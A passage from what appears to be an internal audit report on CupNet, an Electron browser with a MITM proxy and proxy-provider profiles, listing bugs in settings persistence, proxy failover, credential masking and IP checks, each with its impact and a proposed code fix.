- **Impact:** The primary proxy is down and the fallback list is 'de1.provider.net:8000, de2.provider.net:8000'. Failover rejects immediately with 'Unsupported proxy protocol "de1.provider.net:"' and de2 is never tried.
- **Fix:** In sanitizeProxyUrl: `const hasScheme = /^[a-z][a-z0-9+.-]*:\/\//i.test(proxyUrl); const input = hasScheme ? proxyUrl : 'http://' + proxyUrl; u = new URL(input);` and return `input`, the normalized URL with a scheme. In connectProxyWithFailover: `let candidateMasked; try { candidateMasked = maskForLog(candidate); } catch (e) { lastErr = e; d.emitStabilityEvent('warn', 'proxy.candidate_invalid', { attempt: i + 1 }); continue; }`.

#### A-258 ⚪ ctx.net and ctx.getMainWindow are missing from the IPC scope: the net.fetch fallback always crashes and open-devtools targets the wrong window
- **Where:** `main-process/cupnet-runtime.js:1338` · **Category:** ipc-contract · **Status:** open
- **Impact:** In the Log viewer, Repeat/Execute a request that goes down the net.fetch path: it always errors. Pressing the DevTools button in the Proxy Manager or Rules window opens DevTools for the active browser tab instead of that window.
- **Fix:** Add "net" to main-process/ipc/ipc-scope-key-list.json and `case 'net': return net;` to ipcScopeGet in cupnet-runtime.js (net is already imported at L8), then regenerate _ipc-scope-accessors.inc.js. In cookies-dns-ipc.js:420, replace the getMainWindow call with `const mainWin = ctx.mainWindow || null;`. Optionally add a unit test that every ctx.<key> read in handlers/*.js appears in the key list.

#### A-259 ⚪ will-quit discards settings saved within 300ms of quitting
- **Where:** `main-process/cupnet-runtime.js:1461` · **Category:** data-loss · **Status:** open
- **Impact:** The user toggles CORS bypass or changes the homepage and immediately presses Cmd+Q, then confirms. On the next launch the change is gone.
- **Fix:** In settings-store.js, store the pending save as `_pendingSave = { filePath, s }` in saveSettings, and add `function flushPendingSave(){ if(_saveSettingsTimer){ clearTimeout(_saveSettingsTimer); _saveSettingsTimer=null; } if(_pendingSave){ const {filePath,s}=_pendingSave; _pendingSave=null; try{ writeFileSecure(filePath, JSON.stringify(settingsForDisk(s),null,2)); }catch(e){ sysLog('warn','settings','Flush failed: '+e.message);} } }`. Clear _pendingSave when the timer callback runs, import writeFileSecure from secure-fs.js, export flushPendingSave, and call it in will-quit in place of cancelPendingSave().
- _Reported 2× (also: x-lifecycle)_

#### A-260 ⚪ Onboarding runs next to the profile gate, and completing it after login writes the flag to the profile file, so onboarding repeats forever
- **Where:** `main-process/cupnet-runtime.js:1419` · **Category:** correctness · **Status:** open
- **Impact:** First launch: the user creates or logs into a profile, then clicks Finish in the welcome wizard. Every later launch shows the wizard again.
- **Fix:** In the 'onboarding-complete' and 'reset-onboarding-wizard' handlers, also read-modify-write the global file settingsStore.getSettingsFilePath() to set onboardingComplete (write synchronously via secure-fs). Simpler alternative: move the setImmediate onboarding check into ipcScope.onProfileLoggedIn (cupnet-runtime.js:1360), after the profile store is active, so the flag is read and written consistently in the profile file.
- _Reported 2× (also: browser-ui)_

#### A-261 ⚪ SLO 'worker restarts per hour' compares a lifetime counter, so it warns every 30s forever after 6 restarts
- **Where:** `main-process/cupnet-runtime.js:1015` · **Category:** correctness · **Status:** open
- **Impact:** After 6 worker restarts spread over days, sysLog 'stability' emits slo.worker_restarts_high every 30 seconds for the rest of the session.
- **Fix:** Keep an array of restart timestamps, pushed on the 'worker-exited' event in proxy-service.js:274 or in the stats timer when the lifetime count increases. Prune entries older than 3600000 ms, and compare the array's length (restarts in the last hour) against workerRestartsWarnPerHour instead of the lifetime gauge. The lifetime gauge can stay for display.

#### A-262 ⚪ getInternalPageUrl builds file:// URLs by string concatenation
- **Where:** `main-process/cupnet-runtime.js:489` · **Category:** compat · **Status:** open
- **Impact:** The app is installed under a folder whose path contains '#' (for example C:\Tools\C#\CupNet). The new tab, Settings and Guide pages fail to load.
- **Fix:** Replace these with require('url').pathToFileURL(path.join(_cupnetRoot, file)).href in cupnet-runtime.js:489, and use the same call in tab-manager.js:941 (and in electron-app/app.js:811 if that file is ever used).

#### A-263 ⚪ Mock rows inserted by maybeLogMockToNetworkActivity do not update logEntryCount; the default ext-port log message names the wrong port
- **Where:** `main-process/cupnet-runtime.js:336` · **Category:** correctness · **Status:** open
- **Impact:** With 50 mocked requests the REC badge shows 50 fewer entries than the log viewer. Support logs point users to port 9001, which is not listening.
- **Fix:** Inside .then((dbId) => { if (!dbId) return; logEntryCount++; ... }). Change the log line to sysLog('info','ext-proxy',`Created default external port ${defaultPort.port} (first run)`).

#### A-276 ⚪ Mixed memory units in get-app-metrics: Chromium rows are in KB, CupNet child rows in bytes
- **Where:** `main-process/ipc/handlers/diagnostics-ipc.js:26` · **Category:** correctness · **Status:** open
- **Impact:** The status bar shows 'RAM 48 MB' while Chromium actually uses about 1.5 GB; the number is dominated by the Go worker's bytes. Settings > Performance shows the Go worker using '51200.0 MB'.
- **Fix:** Normalize to KB in diagnostics-ipc.js: `memWorkingSet: Math.round((st?.memWorkingSetBytes ?? 0) / 1024), memPrivate: Math.round((st?.memPrivateBytes ?? 0) / 1024)`. Then change browser-renderer.js _fmtResourceMb to treat its input as KB: `(n / 1024).toFixed(n > 100 * 1024 ? 0 : 1) + ' MB'`, with the n<=0 guard kept. settings-renderer.fmtMb is already correct for KB.

#### A-293 ⚪ Import, reset or the activity-monitor toggle re-homes every tab to the global logging session
- **Where:** `main-process/ipc/handlers/settings-toolbar-ipc.js:20` · **Category:** data-loss · **Status:** open
- **Impact:** Tab 3 is an isolated tab logging into session #42 and the global session is #40. The user toggles the Activity Monitor. Tab 3's requests are now written to session #40, session #42 ends up incomplete, and requests that were pending during the toggle disappear from the log.
- **Fix:** In setupNetworkLogging's existing-state branch, clear the in-flight maps only when the session actually changes: `if (state.sessionId !== sessionId) { state.ongoingRequests.clear(); state.ongoingWebsockets.clear(); state.extraInfoQueue.clear(); }`, then assign tabId and sessionId. Optionally, call reattachActivityMonitorToAllTabs only when activityMonitorEnabled changed.

#### A-296 ⚪ Mouse-activity screenshots and idle tracking ignore mouse movement inside tab pages
- **Where:** `main-process/ipc/handlers/tracking-ipc.js:10` · **Category:** correctness · **Status:** ✅ FIXED 2026-09-23 — report-tab-pointer updates lastMouseMoveTime.
- **Impact:** The user enables 'screenshot on mouse activity' and interacts with a website for minutes. No mouse-activity screenshots are recorded.
- **Fix:** In the 'report-tab-pointer' handler (tracking-ipc.js), after the tabId and payload checks, add a throttled activity update: `const now = Date.now(); if (now - (ctx.lastMouseMoveTime || 0) > 1000) ctx.lastMouseMoveTime = now;`. It can also be restricted to the active tab (`ctx.tabManager?.getActiveTabId() === tabId`) so a background tab cannot keep it alive. 'lastMouseMoveTime' is already in the writable IPC scope keys (cupnet-runtime.js:1181), so no other change is needed.

#### A-303 ⚪ console_logs persists all stdout/stderr in plaintext even when REC is off and trafficLogEncryption='encrypt'
- **Where:** `main-process/services/console-capture.js:127` · **Category:** security · **Status:** open
- **Impact:** The user sets trafficLogEncryption=encrypt and never enables REC. With MITM debug level raised, request URLs and headers still end up in cupnet.db in plaintext.
- **Fix:** In cupnet-runtime.js onPersistBatch, skip persistence unless isLoggingEnabled. Apply the traffic-log-crypto redact/encrypt policy from settings.trafficLogEncryption to row.text before insert, or at minimum drop rows with source==='mitm' && level==='debug' and lines starting with '[traffic-filter]'. Optionally add a 'persistConsoleLogs' setting that defaults to false.

#### A-312 ⚪ Importing settings does not validate types; a bad homepage or filterPatterns breaks startup tab creation or logging
- **Where:** `main-process/services/settings-store.js:343` · **Category:** correctness · **Status:** open
- **Impact:** The user imports a JSON file with "homepage": 1 (or an object). On every launch the first tab fails to be created and the browser opens with no tab. Ctrl+T also fails until the user edits settings.json by hand.
- **Fix:** In materializeSettingsFromRaw add: `homepage: typeof raw.homepage === 'string' ? raw.homepage.trim() : SETTINGS_DEFAULTS.homepage`, `filterPatterns: Array.isArray(raw.filterPatterns) ? raw.filterPatterns.filter(p => typeof p === 'string') : SETTINGS_DEFAULTS.filterPatterns`, `pasteUnlock: raw.pasteUnlock !== false`, `lastLogPath: typeof raw.lastLogPath === 'string' ? raw.lastLogPath : null`. Also harden getNewTabUrl: `const hp = String(settingsStore.getCached()?.homepage ?? '').trim();`.
- _Reported 2× (also: tool-windows-b)_

#### A-313 ⚪ A corrupt settings.json is silently replaced by defaults and overwritten, with no backup
- **Where:** `main-process/services/settings-store.js:375` · **Category:** data-loss · **Status:** open
- **Impact:** A power loss corrupts settings.json. On next launch all settings reset silently and the original bytes are overwritten about 300ms later, so recovery is impossible.
- **Fix:** In the loadSettings catch, when the file exists: `try { fs.copyFileSync(settingsFilePath, settingsFilePath + '.corrupt-' + Date.now()); } catch {}`. Keep `onboardingComplete = true` when a file existed, and log a warning or notify the user. Optionally, copy the previous file to settings.json.bak before each successful rename in saveSettings.

#### A-314 ⚪ Shared settings debounce timer lets a save for one profile cancel a pending save for another _(WIP)_
- **Where:** `main-process/services/settings-store.js:394` · **Category:** data-loss · **Status:** open
- **Impact:** The user changes a setting and within 300ms clicks Switch profile. reloadSettings on the global file triggers a migration or traffic-mode save, and the profile's change is lost.
- **Fix:** Keep pending writes per path: `const _pending = new Map(); // path -> {timer, obj}`. In saveSettings, clear only `_pending.get(filePath)?.timer`. Add `flushPendingSaves()`, which synchronously writes every pending entry (fs.writeFileSync plus hardenExistingFile). Call it at the start of setActiveProfileVaultId and in will-quit instead of cancelPendingSave().

#### A-322 ⚪ main.js resolves the CA directory by hand before the single-instance lock, ignoring --user-data-dir and XDG_CONFIG_HOME
- **Where:** `main.js:13` · **Category:** correctness · **Status:** open
- **Impact:** Two quick double-clicks on first install leave a key/cert mismatch. External clients that trust ca-cert.pem (ext-proxy port users) then fail TLS with CupNet-issued leaf certificates.
- **Fix:** In main.js, parse a --user-data-dir=<dir> argument from process.argv and use it when present, and on Linux use process.env.XDG_CONFIG_HOME || ~/.config. In mitm-ca.js loadOrGenerateCA: write each file to <file>.tmp-<pid> and then fs.renameSync. After loading, check that crypto.createPublicKey(caKey).export({type:'spki',format:'der'}) matches new crypto.X509Certificate(savedCert).publicKey.export({type:'spki',format:'der'}), and regenerate if it does not.
- _Reported 2× (also: build-ci-tests)_

#### A-342 ⚪ Packaging ships dead and debug code (electron-app/app.js, debug-main.js, _debug_*.js, tests, scripts)
- **Where:** `package.json:1` · **Category:** packaging · **Status:** open
- **Impact:** The release asar is larger and contains a second, stale IPC implementation plus debug scripts. If app.js is ever required by mistake, every channel would be registered twice and ipcMain.handle would throw.
- **Fix:** Add exclusions to build.files: '!electron-app/**', '!debug-main.js', '!_debug_*.js', '!tests/**', '!docs/**', '!**/*.md', '!todo.md', and '!scripts/**' (keep any script needed at runtime, such as after-pack, which runs at build time anyway). Narrow asarUnpack from 'node_modules/**' to the native modules: 'node_modules/better-sqlite3/**', 'node_modules/argon2/**', 'node_modules/ffi-napi/**', 'node_modules/ref-napi/**' and their bindings. Optionally delete electron-app/app.js and debug-main.js from the repo.
- _Reported 3× (also: build-ci-tests)_

#### A-379 ⚪ sys-log flushOnExit duplicates every error and critical entry into critical.log on each exit, with no rotation
- **Where:** `sys-log.js:132` · **Category:** leak · **Status:** open
- **Impact:** A session with a noisy error, such as a repeating unhandledRejection, adds up to 2000 lines to critical.log on every quit. The file grows without bound and criticals appear twice.
- **Fix:** In flushOnExit, filter only e.level === 'error', because criticals are already persisted. Before appending, run the same size check as writeToCriticalLog: stat the file and, if it is over MAX_CRITICAL_LOG_SIZE, rename it to .1 and then write. Optionally remember the last flushed entry's timestamp or index so errors are never re-flushed.
- _Reported 2× (also: x-lifecycle)_

#### A-391 ⚪ resolveNavigationUrl turns 'localhost:3000' into a web search
- **Where:** `utils.js:64` · **Category:** ux-broken · **Status:** open
- **Impact:** A developer types localhost:3000 in the omnibox and gets a DuckDuckGo search, which also sends the local hostname to the search engine through the proxy.
- **Fix:** In resolveNavigationUrl, before the search fallback, add: if (/^(localhost|\[[0-9a-f:]+\]|[a-z0-9-]+)(:\d{1,5})?(\/\S*)?$/i.test(s) && (/^localhost\b/i.test(s) || /:\d{1,5}(\/|$)/.test(s))) return 'http://' + s;. Also, when the host is loopback or private (127.*, 10.*, 192.168.*, 172.16-31.*, localhost), put http:// in front instead of https:// in the dotted-host branch.

### Proxy

#### A-033 🟠 Password masking in url_display uses String.replace on the first occurrence, which leaks the password
- **Where:** `main-process/ipc/handlers/proxy-ipc.js:89` · **Category:** security · **Status:** open
- **Impact:** The user saves 'http://user123:123@proxy:8080'. The DB and the UI tooltip hold 'http://user***:123@proxy:8080', so the password '123' is stored and shown in plaintext.
- **Fix:** Add one shared helper, for example maskProxyTemplateForDisplay(template) in proxy-profile-resolve.js: `const m = /^([a-z][a-z0-9+.-]*:\/\/)([^:@\/]*):([^@\/]*)@/i.exec(t); if (m) return m[3] && !/^\{[^}]+\}$/.test(m[3]) ? m[1]+m[2]+':***@'+t.slice(m[0].length) : t; return t.includes('@') ? '<redacted>' : t;`. It masks only the password group and keeps a pure {placeholder} password visible. Use it in proxy-ipc.js:86-92, in the save-proxy-profile handler, and in session-profile-proxy.js:26-29. Separately, wrap get-proxy-profiles with guardIpcHandler, or return a reduced DTO to tab senders.

#### A-037 🟠 Fail-closed branch never clears the MITM upstream: traffic keeps using the old proxy (or a dead port) while the UI shows 'Direct'
- **Where:** `main-process/services/global-proxy-connect.js:185` · **Category:** correctness · **Status:** open
- **Impact:** The user is connected to credential-less profile A (http://1.2.3.4:3128, used raw as upstream). They connect profile B, whose template has an unresolved {PORT}, so anonymizeProxy throws. The catch block sets 'blocked', but mitm.upstream is still A: all traffic goes out via A while the UI says Direct/blocked. If A was authenticated, the upstream is the already-closed 127.0.0.1:P, so every request fails with connection refused instead of the 'Egress blocked' page.
- **Fix:** In global-proxy-connect.js:185, pass force: true to applyEffectiveTrafficMode({ source: 'connect-proxy-template.failclosed', profileId, force: true }), or call ctx.mitmProxy?.setUpstream?.(null) explicitly before setEgressBlocked(true). setUpstream(null) does not lift the block (mitm-proxy.js:844), so keeping setEgressBlocked(true) in its current place works, but calling it after the apply is more robust. Also add egressBlocked/egressBlockReason to the notifyProxyStatus payload so the UI shows 'Blocked' instead of 'Direct'.
- _Reported 2× (also: mitm-intercept)_

#### A-106 🟡 External proxy ports keep a reference to the MitmProxy instance from start time, so they break after a MITM restart (or crash when MITM is null)
- **Where:** `main-process/ipc/handlers/ext-proxy-ipc.js:13` · **Category:** correctness · **Status:** open
- **Impact:** An ext port is running on 7777 and the user clicks 'Restart MITM'. Every request through 7777 now returns a 502 or times out until the port is stopped and started again.
- **Fix:** Change ExternalProxyPort to take a getter: in ext-proxy-ipc.js pass `() => ctx.mitmProxy`. In mitm-proxy.js ExternalProxyPort, store `this._getParent = typeof parentProxy === 'function' ? parentProxy : () => parentProxy`. In _handleHttp and dispatchRequest, do `const parent = this._getParent(); if (!parent) { write 'HTTP/1.1 503 Service Unavailable\r\nContent-Length: 0\r\nConnection: close\r\n\r\n'; end; return; }` and use `parent` instead of this.parent. Also make ext-proxy:start/create return {success:false, error:'MITM proxy is not running'} when ctx.mitmProxy is null.

#### A-118 🟡 Creating or duplicating a profile whose name already exists silently overwrites the other profile
- **Where:** `main-process/ipc/handlers/proxy-ipc.js:123` · **Category:** data-loss · **Status:** open
- **Impact:** The user duplicates profile X twice. The second 'X (copy)' overwrites the first copy. Creating a new profile named like the connected profile replaces that profile's upstream.
- **Fix:** In proxy-ipc.js save-proxy-profile-full, before calling saveProxyProfileAsync for a new profile, check for an existing profile with that name. Use `if (ctx.db.getProxyProfiles().some(p => p.name === profile.name)) return { success: false, error: 'A profile with this name already exists' };`, or add a db.insertProxyProfile that does a plain INSERT. Alternatively, have performDuplicateProfile pick a unique name such as '(copy 2)'. Keep upsert-by-name only for last_session_proxy.

#### A-126 🟡 A failed post-connect geo check overwrites last_ip/last_geo with 'unknown' and ', '
- **Where:** `main-process/services/global-proxy-connect.js:145` · **Category:** data-loss · **Status:** open
- **Impact:** The upstream is briefly slow and all geo sources time out. The profile's previously good last_ip/last_geo is replaced with 'unknown' and ', ', the list badge shows ', ', and the country filter loses the profile.
- **Fix:** In global-proxy-connect.js .then: `if (geo?.ip && geo.ip !== 'unknown') { const geoStr = [geo.city, geo.country_name].filter(Boolean).join(', '); ctx.db?.updateProxyProfileGeoAsync?.(profileId, geo.ip, geoStr || null).catch(...); ctx.notifyProxyProfilesList?.(); }`. Keep the snapshot insert as it is.

#### A-127 🟡 connectGlobalProxyProfile resolves the template twice, so the SID/RAND shown to the user differ from the ones actually connected
- **Where:** `main-process/services/global-proxy-connect.js:91` · **Category:** correctness · **Status:** open
- **Impact:** On a Decodo sticky profile, the UI shows SID cupnet1111 and port 23456, but the real connection used cupnet2222 and port 11111. A user who pastes the shown SID to keep the same sticky IP gets a different exit IP.
- **Fix:** Add a 4th param `resolvedOut` to resolveProxyTemplateFromDbRow and forward it: `return ctx.parseProxyTemplate(template, mergedVars, resolvedOut);`. In connectGlobalProxyProfile call `resolveProxyTemplateFromDbRow(ctx, row, mergedVars, resolvedVars)` and delete the second parse block at L83-92. Check the connect-proxy-template IPC handler for the same double parse.
- _Reported 2× (also: same area)_

#### A-128 🟡 Concurrent connect/disconnect paths interleave, leaving the upstream of one profile with the fingerprint/TLS/name of another
- **Where:** `main-process/services/global-proxy-connect.js:103` · **Category:** race · **Status:** open
- **Impact:** A session-profile autoload connects A while the user clicks Connect on B, or a web page calls connectProxyTemplate. B's upstream ends up active while connectedProfileId, UA and JA3 belong to A.
- **Fix:** In global-proxy-connect.js add a module-level `let _proxyOpChain = Promise.resolve(); function runProxyOp(fn){ const p = _proxyOpChain.then(fn, fn); _proxyOpChain = p.catch(()=>{}); return p; }` and export it. Run the whole body of connectGlobalProxyProfile and disconnectGlobalProxy through it (keep the inner functions as `_connectUnlocked` / `_disconnectUnlocked`). Also wrap the connect-direct, quick-connect and apply-quick-proxy-change handler bodies in runProxyOp. _prepareGlobalProxyForSession should run its disconnect, tab reset and connect as one runProxyOp call using the unlocked variants, to avoid a nested-lock deadlock. Separately, remove connectProxyTemplate from preload-view.js or wrap 'connect-proxy-template' in guardIpcHandler so web pages cannot trigger it.

#### A-138 🟡 notifyProxyStatus never reaches tab pages (the tab Map iterator is consumed twice), and per-tab names are never shown
- **Where:** `main-process/services/proxy-notify-broadcast.js:102` · **Category:** correctness · **Status:** open
- **Impact:** The new-tab page IP/proxy widget (onProxyStatusChanged in preload-view) never updates after connect/disconnect. The main-window pill never shows a per-tab proxy name.
- **Fix:** At L73-74 use `const tabsArr = Array.from(tabManager?.getAllTabs?.() || []);` and iterate tabsArr at L102-103. At L47 drop the `!tab.cupnetEnabled` check (`if (!tab || !tab.proxyProfileId)`). Add `active: activeTab?.id ?? null` to the sig object.

#### A-140 🟡 check-ip-geo cache returns the previous profile's IP after a switch, and connect then persists it as the new profile's last_ip and HAR egress
- **Where:** `main-process/services/proxy-service.js:38` · **Category:** correctness · **Status:** open
- **Impact:** The Proxy Manager checks the IP of profile A (DE). Within 60s the user connects profile B (US) or clicks Reconnect to rotate the sticky SID. The status shows the DE IP, B's list badge shows the DE IP/geo, and the exported HAR comment says Country: DE.
- **Fix:** In proxy-service.js add `function invalidateIpGeoCache(){ _ipGeoCache={key:'',at:0,value:null}; _ipGeoFailCache={key:'',at:0}; _checkIpGeoInFlight=new Map(); }`, export it, and wire it into ctx. Call it in _doQuickChangeProxy after d.setPersistentAnonymizedProxyUrl(next), in disconnectGlobalProxy, and in the set-tab-proxy handler. Recreating the Map (instead of clearing it) makes sure a stale in-flight promise is never reused; its .finally only deletes its own entry. Also add d.getConnectedProfileId?.() ?? '' to _ipGeoEgressKey as a second guard.

#### A-141 🟡 IP check uses a direct Node request (real IP) for per-tab-proxied tabs and while egress is blocked
- **Where:** `main-process/services/proxy-service.js:654` · **Category:** security · **Status:** open
- **Impact:** A tab with per-tab profile X and no global proxy shows the user's home IP in the IP widget. After a failed connect (blocked state), the Proxy Manager's automatic re-check contacts ipinfo.io directly from the real IP and displays it.
- **Fix:** In checkCurrentIpGeoInternal, before branching: `const mitm=d.getMitmProxy?.(); const egress=_resolveEgressForIpGeo(geoTab, anon); if (mitm?._egressBlocked && !egress.proxy) return { ...empty, blocked: true };`. Use the worker branch whenever egress.proxy is set, and Node direct only when it is not and egress is not blocked. Do the same in getRealIp. For the post-connect geo, add an option such as checkCurrentIpGeo(null, {globalOnly:true}) so that _resolveEgressForIpGeo uses mitm.upstream/anon with no tabId. Include that option in the cache and flight key.

#### A-142 🟡 _doQuickChangeProxy: wrong port reuse, inverted EADDRINUSE retry, inconsistent state on failure, and a blocking error dialog
- **Where:** `main-process/services/proxy-service.js:918` · **Category:** correctness · **Status:** open
- **Impact:** The user is connected to 'socks5://1.2.3.4:1080' without auth and has `ssh -D 1080` running locally. Connecting an authenticated profile tries 127.0.0.1:1080, then retries 1080 again, then shows a modal. While the modal is open, all browsing stalls, and afterwards the connect fails into fail-closed.
- **Fix:** const oldPort = (() => { try { const u = cur && new URL(cur); return u && u.hostname === '127.0.0.1' ? Number(u.port) || undefined : undefined; } catch { return undefined; } })(); In the catch block, retry with `isBusy || !oldPort ? ProxyChain.anonymizeProxy(proxyUrl) : ProxyChain.anonymizeProxy({ url: proxyUrl, port: oldPort })` (in effect, always use a random port when the port is busy). In the e2 catch, call d.setPersistentAnonymizedProxyUrl(null) and d.setActProxy(''), remove d.dialog.showErrorBox, and just rethrow (callers already return the error to the UI).

#### A-143 🟡 Failover, circuit breaker and fail-closed never react to a dead upstream (anonymizeProxy does not dial)
- **Where:** `main-process/services/proxy-service.js:973` · **Category:** correctness · **Status:** open
- **Impact:** A profile with wrong credentials or a dead host 'connects' successfully. FALLBACK_PROXIES are never tried, the breaker never opens, and the fail-closed block never engages. The user gets 407/502 on every page while the UI shows Connected.
- **Fix:** In connectProxyWithFailover, after quickChangeProxy resolves, probe through the MITM worker with the candidate upstream, e.g. `await withTimeout(mitm.worker.request({url: checkUrl, proxy: candidate, ...}), networkPolicy.timeouts.proxyOperationMs)`. Treat 407, CONNECT errors and timeouts as a thrown failure, and call registerSuccess only after the probe succeeds. In proxy-resilience.js _normalizeProxy, include the username in the key: `${u.protocol}//${u.username ? decodeURIComponent(u.username)+'@' : ''}${u.hostname}:${port}`.

#### A-144 🟡 sanitizeProxyUrl fallback returns the unmasked URL, so proxy-service logs plaintext passwords
- **Where:** `main-process/services/proxy-service.js:889` · **Category:** security · **Status:** open
- **Impact:** A template with an unresolved {PORT} variable prints 'http://u:SECRETPW@host:{PORT}' to stdout and the stability log.
- **Fix:** In network-helpers.js, stop using the 'http://'+url fallback URL for masking. On a parse failure, compute `masked = String(proxyUrl).replace(/\/\/([^:@\/]*):[^@\/]*@/, '//$1:***@')`, and for the fallback-parsed case always apply the same regex instead of returning proxyUrl. Better still, throw when /\{[^}]+\}/ remains in the URL. In connectProxyWithFailover, compute candidateMasked with try/catch, e.g. `let candidateMasked; try { candidateMasked = maskForLog(candidate); } catch { candidateMasked = '[invalid proxy url]'; }`.

#### A-147 🟡 upsertLastSessionProxyProfile is fail-open: it stores the full proxy URL in plaintext when safeStorage is unavailable
- **Where:** `main-process/services/session-profile-proxy.js:23` · **Category:** security · **Status:** ✅ FIXED 2026-09-23 — fail-closed: no plaintext proxy URL with credentials.
- **Impact:** On Linux without a keyring, loading a session profile with an inline proxy writes 'http://user:secret@host' into proxy_profiles.url_display. That value is readable in the DB and via get-proxy-profiles.
- **Fix:** In upsertLastSessionProxyProfile, when encryption is unavailable or encryptString throws, do not persist. Return a sentinel such as `{ ephemeralTemplate: template }`, or have _prepareGlobalProxyForSession (session-profile-loader.js:160) resolve the template with proxy.variables and connect directly without a DB row. Failing that, return null so session load fails with 'OS secure storage unavailable'. Never write url_display=template when url_encrypted is null.

#### A-170 🟡 Clicking a TLS template in any profile editor immediately changes the live global MITM TLS profile and persists it
- **Where:** `proxy-manager-renderer.js:209` · **Category:** correctness · **Status:** open
- **Impact:** Profile A (Chrome template + custom JA3) is connected. The user opens profile B, clicks 'Firefox' to look at it, then cancels. Live traffic now uses Firefox H2/TLS with A's Chrome JA3 (an inconsistent fingerprint), and the Firefox profile is persisted for startup.
- **Fix:** Remove the line `api.setTlsProfile && api.setTlsProfile(tpl).catch(() => {});` from the .tls-tpl-btn handler at proxy-manager-renderer.js:209, so the TLS template is applied only on Connect/Reconnect (connectGlobalProxyProfile or connect-direct). To keep a live preview, guard the call with `if (selectedId === connectedId && selectedId !== DIRECT_ID)`, and have set-tls-profile clear mitmProxy._activeJa3 when the connected profile uses template mode.
- _Reported 2× (also: azuretls-fingerprint)_

#### A-171 🟡 The Direct profile's UA/timezone/language/force HTTP/1.1/custom JA3 are saved but never applied, and the previous fingerprint and forceHttp1 stay active
- **Where:** `proxy-manager-renderer.js:1771` · **Category:** ux-broken · **Status:** open
- **Impact:** The user sets UA 'Firefox' and Force HTTP/1.1 on Direct and clicks Connect (Direct). Nothing changes. After switching from profile A (Chrome Mac UA, force_http1) to Direct, tabs keep A's UA and forced HTTP/1.1.
- **Fix:** Change connect-direct to accept an object: `(_, opts) => { const o = typeof opts === 'string' ? { tls_profile: opts } : (opts || {}); ... }`. After setBrowser, call `ctx.mitmProxy.setForceHttp1(!!o.force_http1)` and set `ctx.mitmProxy._activeJa3 = (o.tls_ja3_mode === 'custom' && o.tls_ja3_custom) ? o.tls_ja3_custom : null`. If o.user_agent, o.timezone or o.language is set, assign ctx.activeFingerprint = {user_agent, timezone, language} and await ctx.applyFingerprintToAllTabs(ctx.activeFingerprint). Otherwise, when ctx.activeFingerprint exists, call resetFingerprintOnWebContents on every tab and set ctx.activeFingerprint = null. In the renderer, call api.connectDirect(directData).

#### A-172 🟡 IPRoyal template puts targeting parameters in the username (IPRoyal expects them in the password), and the SID is 16 characters
- **Where:** `proxy-providers.js:348` · **Category:** correctness · **Status:** open
- **Impact:** A saved IPRoyal profile gets 407 auth errors (the username with suffixes is unknown), or country and sticky targeting are ignored.
- **Fix:** In the iproyal buildTemplate, build the URL as `${this.scheme}://${u}:${encPasswordForUrl(p)}_country-${cc}${sticky ? `_session-{RAND:10000000-99999999}_lifetime-${dur}m` : ''}@${host}:${port}`. Append the suffix after encoding, so that the `{...}` placeholders survive for parseProxyTemplate. If {SID} is kept, add a provider-specific 8-character alphanumeric generator, for example an `{SID8}` token in utils.parseProxyTemplate and resolveProviderTemplateForTest. Also strip the `_country-…`/`_session-…` suffixes from a pasted password, the way normalizeProviderAccountUsername does for the username.

#### A-239 ⚪ Decodo 'bd' row uses sticky port 41001 as its rotating port
- **Where:** `decodo-endpoints.js:99` · **Category:** correctness · **Status:** open
- **Impact:** A 'Rotating' Bangladesh profile connects to sticky port 41001 and keeps the same exit IP.
- **Fix:** Change decodo-endpoints.js:99 to `['bd', 'Bangladesh', 'Asia', null, 41001, 41099, 41000],` after confirming against Decodo's endpoint table.

#### A-277 ⚪ ext-proxy:create persists the config before start, leaks an open DB session on start failure, and set-port allows duplicate ports
- **Where:** `main-process/ipc/handlers/ext-proxy-ipc.js:121` · **Category:** error-handling · **Status:** open
- **Impact:** Creating port 8080 while another app uses it leaves a dead config entry and an orphaned 'ext:8080' session in the history list.
- **Fix:** In ext-proxy:create, check for duplicates, call `await startExtPort(entry)` first, and only then push and save. In startExtPort's catch, add `try { await ctx.db.endSessionAsync(sess.id); } catch {}` before rethrowing. In set-port, reject when `config.ports.some(p => p.port === port && p !== entry)`, and after saving call `if (wasActive) await startExtPort(entry)`. In ExternalProxyPort, track sockets in a Set in _handleConnection (delete on 'close') and destroy them all in stop(). Either implement autoStart at startup (iterate the config after MITM is ready) or remove the field. Optionally encrypt passwords with safeStorage.

#### A-286 ⚪ Test results return and display the resolved proxy URL with plaintext credentials
- **Where:** `main-process/ipc/handlers/proxy-ipc.js:164` · **Category:** security · **Status:** open
- **Impact:** The user runs Test while screen-sharing, and the full 'http://user:password@host' appears in the 'URL used' row.
- **Fix:** In proxy-manager-renderer.js:1825 and 1833, display `pp.maskProxyUrlForDisplay?.(result.resolvedUrl) || result.resolvedUrl || '—'`. Alternatively, return `resolvedUrl: maskProxyUrlForDisplay(resolved)` from test-proxy-template, since no caller needs the plaintext URL back.

#### A-287 ⚪ Legacy test-proxy-profile NULLs last_ip/last_geo on success
- **Where:** `main-process/ipc/handlers/proxy-ipc.js:230` · **Category:** data-loss · **Status:** open
- **Impact:** Calling testProxyProfile(id) successfully clears the profile's stored IP and geo badge.
- **Fix:** Remove the 'test-proxy-profile' handler, the preload testProxyProfile binding and proxy-selector.js. If the handler is kept, pass `result.data?.ip` and `[result.data?.city, result.data?.country].filter(Boolean).join(', ')` to updateProxyProfileTestAsync, and only when result.data is present.

#### A-288 ⚪ Deleting the connected or a tab-assigned profile leaves stale connection state
- **Where:** `main-process/ipc/handlers/proxy-ipc.js:213` · **Category:** correctness · **Status:** open
- **Impact:** The user deletes the connected profile. The pill still shows its name, and Reconnect fails with 'Profile not found'.
- **Fix:** In the delete-proxy-profile handler, before deleting: if `ctx.connectedProfileId === id`, return `{ success: false, error: 'Disconnect this profile before deleting it' }`, or call `await disconnectGlobalProxy(ctx)`. For each tab in ctx.tabManager.getAllTabs() with `t.proxyProfileId === id`, call `await ctx.tabManager.setTabProxy(t.id, null); ctx.mitmProxy?.removeTabUpstream(t.id);`. Then delete and call ctx.notifyProxyStatus(). Update the renderer to handle `{success:false}`, because the handler currently returns `true`.

#### A-289 ⚪ apply-quick-proxy-change keeps the old connectedProfileName, resolvedVars, fingerprint and TLS
- **Where:** `main-process/ipc/handlers/proxy-ipc.js:55` · **Category:** correctness · **Status:** open
- **Impact:** While profile A is connected, applyQuickProxyChange(urlB) routes via B, but the UI still shows 'A' with A's SID and UA.
